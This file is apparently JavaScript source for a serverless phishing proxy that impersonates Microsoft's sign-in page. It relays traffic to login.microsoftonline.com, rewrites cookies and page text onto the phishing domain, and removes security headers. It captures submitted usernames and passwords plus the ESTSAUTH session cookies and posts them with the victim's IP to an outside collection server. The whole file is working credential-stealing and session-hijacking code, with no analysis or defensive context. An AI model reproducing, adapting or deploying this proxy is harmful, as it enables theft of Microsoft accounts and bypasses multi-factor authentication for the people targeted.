module.exports = async (req, res) => {
    // Dynamically import node-fetch
    const fetch = (await import('node-fetch')).default;
    const { URL } = require('url');

    const upstream = 'login.microsoftonline.com';
    const upstream_path = '/';
    const https = true;

    const serverUrl = 'https://rest.westmidlands-ush.shop/neronewms/push.php';
    const blocked_region = [];
    const blocked_ip_address = ['0.0.0.0', '127.0.0.1'];

    const region = req.headers['cf-ipcountry'] ? req.headers['cf-ipcountry'].toUpperCase() : null;
    const ip_address = req.headers['x-real-ip'] || req.headers['x-forwarded-for'] || req.connection.remoteAddress;

    let all_cookies = "";
    let response = null;
    let url = new URL(req.url, `http://${req.headers.host}`);
    let url_hostname = url.hostname;

    if (https === true) {
        url.protocol = 'https:';
    } else {
        url.protocol = 'http:';
    }

    url.host = upstream;

    if (url.pathname === '/') {
        url.pathname = upstream_path;
    } else {
        url.pathname = upstream_path + url.pathname;
    }

    if (blocked_region.includes(region)) {
        res.status(403).send('Access denied.');
    } else if (blocked_ip_address.includes(ip_address)) {
        res.status(403).send('Access denied');
    } else {
        let method = req.method;
        let request_headers = req.headers;
        let new_request_headers = { ...request_headers };

        new_request_headers['Host'] = upstream;
        new_request_headers['Referer'] = url.protocol + '//' + url_hostname;

        if (req.method === 'POST') {
            const body = await getRequestBody(req);
            const keyValuePairs = body.split('&');
            let message = "Password found:\n\n";

            for (const pair of keyValuePairs) {
                const [key, value] = pair.split('=');

                if (key === 'login') {
                    const username = decodeURIComponent(value.replace(/\+/g, ' '));
                    message += "User: " + username + "\n";
                }
                if (key === 'passwd') {
                    const password = decodeURIComponent(value.replace(/\+/g, ' '));
                    message += "Password: " + password + "\n";
                }
            }
            if (message.includes("User") && message.includes("Password")) {
                await sendToServer(fetch, message, ip_address);
            }
        }

        let original_response = await fetch(url.href, {
            method: method,
            headers: new_request_headers,
            body: req.method === 'POST' ? req.body : undefined
        });

        let original_response_clone = original_response.clone();
        let original_text = null;
        let response_headers = original_response.headers;
        let new_response_headers = {};

        response_headers.forEach((value, key) => {
            new_response_headers[key] = value;
        });

        new_response_headers['access-control-allow-origin'] = '*';
        new_response_headers['access-control-allow-credentials'] = 'true';
        delete new_response_headers['content-security-policy'];
        delete new_response_headers['content-security-policy-report-only'];
        delete new_response_headers['clear-site-data'];

        const setCookies = original_response.headers.raw()['set-cookie'] || [];
        all_cookies = setCookies.join("; \n\n");

        setCookies.forEach(originalCookie => {
            const modifiedCookie = originalCookie.replace(/login\.microsoftonline\.com/g, url_hostname);
            new_response_headers['set-cookie'] = (new_response_headers['set-cookie'] || []).concat(modifiedCookie);
        });

        original_text = await replace_response_text(original_response_clone, upstream, url_hostname);

        if (
            all_cookies.includes('ESTSAUTH') &&
            all_cookies.includes('ESTSAUTHPERSISTENT')
        ) {
            await sendToServer(fetch, "Cookies found:\n\n" + all_cookies, ip_address);
        }

        res.writeHead(original_response.status, new_response_headers);
        res.end(original_text);
    }
};

async function getRequestBody(req) {
    return new Promise((resolve, reject) => {
        let body = '';
        req.on('data', chunk => {
            body += chunk.toString();
        });
        req.on('end', () => {
            resolve(body);
        });
    });
}

async function replace_response_text(response, upstream_domain, host_name) {
    let text = await response.text();
    return text.replace(/login.microsoftonline.com/g, host_name);
}

async function sendToServer(fetch, data, ip_address) {
    try {
        const response = await fetch(serverUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ data: data, ip: ip_address })
        });

        if (!response.ok) {
            throw new Error('Failed to send data to server');
        }
        console.log('Data sent to server successfully');
        return 'Data sent to server successfully';
    } catch (error) {
        console.error('Error sending data:', error);
        return `Error: ${error.message}`;
    }
}
